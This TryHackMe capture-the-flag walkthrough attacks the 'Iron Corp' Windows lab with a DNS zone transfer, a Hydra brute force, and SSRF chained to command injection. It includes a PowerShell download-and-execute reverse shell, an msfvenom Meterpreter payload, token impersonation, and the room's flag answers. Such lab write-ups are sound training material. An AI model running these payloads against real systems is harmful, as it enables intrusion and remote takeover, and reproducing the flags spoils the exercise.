# Iron Corp — TryHackMe Walkthrough

> Can you get access to Iron Corp's system? Iron Corp suffered a security breach not long ago. They did system hardening and are expecting you not to be able to access their system.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/RGcCHrBK/69b68a762493df6acc244e2f71e6eaf3.jpg" alt="69b68a762493df6acc244e2f71e6eaf3" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/ironcorp">
    <img src="https://img.shields.io/badge/TryHackMe-Iron%20Corp-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Windows-blue">
  <img src="https://img.shields.io/badge/Focus-DNS%20%7C%20SSRF%20%7C%20RCE%20%7C%20Token%20Impersonation-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | DNS Zone Transfer Enumeration |
| 4 | Brute Forcing (http-get) |
| 5 | Server-Side Request Forgery (SSRF) |
| 6 | Command Injection via SSRF |
| 7 | Remote File Inclusion — PowerShell Reverse Shell |
| 8 | Metasploit Incognito — Delegation Token Impersonation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate a Windows target and identify services on non-standard ports
- Perform a DNS zone transfer to reveal hidden internal subdomains
- Use Gobuster to enumerate virtual-host-based web applications
- Brute-force HTTP Basic Authentication using Hydra
- Exploit an SSRF vulnerability to reach internal-only services
- Chain SSRF with command injection to achieve Remote Code Execution
- Deliver a Nishang PowerShell reverse shell via URL-encoded RFI
- Use Metasploit's Incognito module to list and impersonate delegation tokens

---

## Prerequisites

- Basic familiarity with Windows and Linux terminal commands
- Nmap, Gobuster, Hydra, Metasploit, and Netcat installed
- Nishang `Invoke-PowerShellTcp.ps1` available to serve via HTTP
- Add `Machine_IP ironcorp.me` and subdomains to `/etc/hosts` before starting
- The asset in scope is: `ironcorp.me`
- Note: The VM may take 5–7 minutes to fully boot — be patient before scanning

---

## Task 1 — Iron Corp

---

### Step 1 — Initial /etc/hosts Configuration

**Approach:** Before any scanning, add the target domain to your hosts file so it resolves correctly.

```
echo "Machine_IP ironcorp.me" | sudo tee -a /etc/hosts
```

> **Note:** This room uses virtual host routing — the web server serves different content depending on the `Host` header in the HTTP request. Without the hosts file entry, browsing to the IP directly will not show the correct pages. Additional subdomains discovered later will also need to be added to this file.

---

### Step 2 — Network Enumeration with Nmap

**Approach:** Run an aggressive Nmap scan using `-Pn` (skip ping, as this is a Windows machine that may block ICMP) to identify all open ports and services.

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ sudo nmap -Pn -A -sS -sC -sV -O ironcorp.me
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 21:21 CEST
Nmap scan report for ironcorp.me (Machine_IP)
Host is up (0.038s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2020-10-21T19:24:29+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2020-10-20T19:20:59
|_Not valid after:  2021-04-21T19:20:59
8080/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.63 seconds
```

Follow-up scan targeting specific ports including the non-standard ones:

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ sudo nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 ironcorp.me
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 21:29 CEST
Nmap scan report for ironcorp.me (Machine_IP)

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain?
135/tcp   open     msrpc         Microsoft Windows RPC
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
8080/tcp  open     http          Microsoft IIS httpd 10.0
11025/tcp open     unknown
49667/tcp filtered unknown
49670/tcp open     unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.46 seconds
```

> **Note:** Port **53 (DNS)** being open is significant — it means the machine is running a DNS server. This opens the possibility of a **DNS zone transfer** attack, which can reveal internal subdomains not publicly listed. Port **11025** is an additional HTTP service worth investigating. Port **3389** is RDP — useful if credentials are obtained later.

---

### Step 3 — DNS Zone Transfer

**Approach:** Use `dig` to perform an AXFR (zone transfer) request against the target's DNS server directly. This asks the DNS server to hand over all records for the `ironcorp.me` zone.

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ dig ironcorp.me @Machine_IP axfr

; <<>> DiG 9.16.2-Debian <<>> ironcorp.me @Machine_IP axfr
;; global options: +cmd
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.            3600    IN      NS      win-8vmbkf3g815.
admin.ironcorp.me.      3600    IN      A       127.0.0.1
internal.ironcorp.me.   3600    IN      A       127.0.0.1
ironcorp.me.            3600    IN      SOA     win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 248 msec
;; SERVER: Machine_IP#53(Machine_IP)
;; WHEN: Wed Oct 21 21:24:40 CEST 2020
;; XFR size: 5 records (messages 1, bytes 238)
```

> **Note:** The zone transfer succeeds — the DNS server is misconfigured to allow AXFR requests from any source. Two internal subdomains are revealed: **`admin.ironcorp.me`** and **`internal.ironcorp.me`**, both pointing to `127.0.0.1` (localhost). This means they are only accessible from the server itself — not directly from the internet. Add both to `/etc/hosts`:
> ```
> echo "Machine_IP admin.ironcorp.me internal.ironcorp.me" | sudo tee -a /etc/hosts
> ```

---

### Step 4 — Web Enumeration on Port 8080 and Port 11025

**Approach:** Run Gobuster against each subdomain on both web ports to map out available pages.

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt
/assets (Status: 301)
/calendar.html (Status: 200)
/forms.html (Status: 200)
/icons.html (Status: 200)
/Index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/profile.html (Status: 200)
/register.html (Status: 200)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301
/css (Status: 301)
/img (Status: 301)
/Index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/license (Status: 200)
/vendor (Status: 301)
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ gobuster dir -u http://admin.ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301
/css (Status: 301)
/img (Status: 301)
/Index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/license (Status: 200)
/vendor (Status: 301)
```

> **Note:** The `admin.ironcorp.me` subdomain on port 11025 prompts for **HTTP Basic Authentication** when visited in a browser. This is our next target — brute-force the credentials to gain access.

---

### Step 5 — Brute-Forcing HTTP Basic Auth with Hydra

**Approach:** Use Hydra with the `http-get` module to brute-force the admin panel on port 11025.

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ hydra -L http_default_users.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt -s 11025 -f admin.ironcorp.me http-get /
Hydra v9.0 (c) 2019 by van Hauser/THC

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14686 login tries (l:14/p:1049), ~918 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-21 21:43:55
```

> **Note:** Hydra cracks the credentials in under 30 seconds: **`admin:password123`**. The `-f` flag stops Hydra as soon as a valid pair is found. The `http-get` module is used because the admin panel uses HTTP Basic Authentication — a header-based mechanism where credentials are Base64 encoded and sent with every request.

---

### Step 6 — Discovering the SSRF Vulnerability

**Approach:** After logging in to `http://admin.ironcorp.me:11025/`, view the page source. A search form with a parameter `r` is present. Test it by passing a URL to the internal subdomain.

Page source of the admin panel:

```html
<script type="text/javascript">
  function lhook(id) {
    var e = document.getElementById(id);
    if (e.style.display == "block") e.style.display = "none";
    else e.style.display = "block";
  }
</script>
<!DOCTYPE html>
<html>
  <head>
    <title>Search Panel</title>
  </head>
  <body>
    <h2>Ultimate search bar</h2>
    <div>
      <form method="GET" action="#">
        <span>Search:
          <input name="r" type="text" placeholder="******" />
          <input type="submit" />
        </span>
      </form>
    </div>
  </body>
</html>
```

Test the `r` parameter with the internal subdomain URL:

```
view-source:http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/
```

Response:

```html
<html>
<body>
  <b>You can find your name <a href=http://internal.ironcorp.me:11025/name.php?name=>here</a>
</body>
</html>
```

> **Note:** The `r` parameter causes the server to fetch the provided URL and return its contents — this is **Server-Side Request Forgery (SSRF)**. Because the request originates from the server itself, it can reach `internal.ironcorp.me` which resolves to `127.0.0.1` and is not accessible from the internet. This gives us a proxy into the internal network.

---

### Step 7 — Command Injection via SSRF

**Approach:** The `name.php` page on the internal host takes a `name` parameter and appears to pass it to a system command. Test for command injection by appending a pipe (`|`) followed by `whoami`.

Request via Burp Suite:

```
GET /?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami HTTP/1.1
Host: admin.ironcorp.me:11025
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

Response:

```html
<html>
  <body>
    <b>My name is: </b>
    <pre>
	nt authority\system
</pre>
  </body>
</html>
```

> **Note:** The `whoami` command executes and returns **`nt authority\system`** — the highest privilege level on Windows. The `name` parameter is passed directly to a shell command without sanitisation. The pipe character (`|`) chains our injected command after the intended one. Since the web server is already running as SYSTEM, we have immediate command execution with full administrative privileges.

---

### Step 8 — Delivering a PowerShell Reverse Shell via URL-Encoded RFI

**Approach:** Craft a PowerShell download-and-execute command using Nishang's `Invoke-PowerShellTcp.ps1`. Because the URL passes through two layers of encoding (SSRF and the `name` parameter), the payload must be double URL-encoded. Serve the script over HTTP and trigger it.

The plaintext payload:

```
powershell.exe -c iex(new-object net.webclient).downloadstring('http://YOUR_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 9001
```

This is URL-encoded twice and appended to the injection point:

```
GET /?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63... HTTP/1.1
Host: admin.ironcorp.me:11025
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on Machine_IP 49974
Windows PowerShell running as user WIN-8VMBKF3G815$ on WIN-8VMBKF3G815
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS E:\xampp\htdocs\internal>whoami
nt authority\system
PS E:\xampp\htdocs\internal> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> type user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}
```

> **Note:** The shell connects as `nt authority\system`. The user flag is found on the Administrator's Desktop. Double URL encoding is required because the `r` parameter decodes the URL once (SSRF), and then the internal `name.php` page decodes it again before passing to the shell — so the payload must survive both decode passes intact.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`thm{09b408056a13fc222f33e6e4cf599f8c}`**

</details>

---

### Step 9 — Upgrading to Meterpreter for Token Impersonation

**Approach:** Generate a Meterpreter payload with msfvenom, download and execute it on the target via the existing PowerShell shell, and catch it in Metasploit. Then use the Incognito module to list and impersonate delegation tokens.

Generate the payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=9002 -f psh -o meterpreter-64.ps1
```

Download and run it on the target from the existing shell:

```
powershell -command "& { iwr YOUR_IP/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"
Import-Module .\meterpreter-64.ps1
```

Start the Metasploit handler:

```
kali@kali:~/CTFs/tryhackme/Iron Corp$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 9002; set ExitOnSession false; exploit -j"

[*] Started reverse TCP handler on YOUR_IP:9002
[*] Sending stage (201283 bytes) to Machine_IP
[*] Meterpreter session 1 opened (YOUR_IP:9002 -> Machine_IP:50020)

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-8VMBKF3G815\Admin
Window Manager\DWM-1

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
[+] Delegation token available
[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
meterpreter > shell
Process 2428 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

E:\xampp\htdocs\internal>whoami
win-8vmbkf3g815\admin

E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
```

> **Note:** Even though the initial shell was already `nt authority\system`, the **root flag is owned by the local `Admin` account** — not SYSTEM. This is why token impersonation is required as the final step. **Delegation tokens** are available when a user has logged in interactively or started a service — they allow a process to fully impersonate that user, including accessing their files. The `getuid` error after impersonation is expected behaviour in Meterpreter; drop to a shell with the `shell` command to confirm the impersonated identity with `whoami`.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`thm{a1f936a086b367761cc4e7dd6cd2e2bd}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | `/etc/hosts` configuration | Mapped `Machine_IP` to `ironcorp.me` |
| 2 | Nmap scan with `-Pn` | Found DNS (53), RPC (135), RDP (3389), IIS (8080), unknown HTTP (11025) |
| 3 | DNS zone transfer (`dig axfr`) | Revealed `admin.ironcorp.me` and `internal.ironcorp.me` pointing to `127.0.0.1` |
| 4 | Gobuster on all subdomains and ports | Mapped web pages on port 8080 and 11025 |
| 5 | Hydra `http-get` brute-force | Cracked `admin:password123` for `admin.ironcorp.me:11025` |
| 6 | SSRF via `?r=` parameter | Reached `internal.ironcorp.me` through the server's own request |
| 7 | Command injection via `name.php` | Confirmed RCE as `nt authority\system` using `|whoami` |
| 8 | Double URL-encoded PowerShell RFI | Delivered Nishang reverse shell, read `user.txt` |
| 9 | msfvenom Meterpreter payload | Upgraded to Meterpreter session |
| 10 | Incognito `impersonate_token` | Impersonated `WIN-8VMBKF3G815\Admin` delegation token |
| 11 | Shell as `Admin` | Accessed `C:\Users\Admin\Desktop\root.txt` |
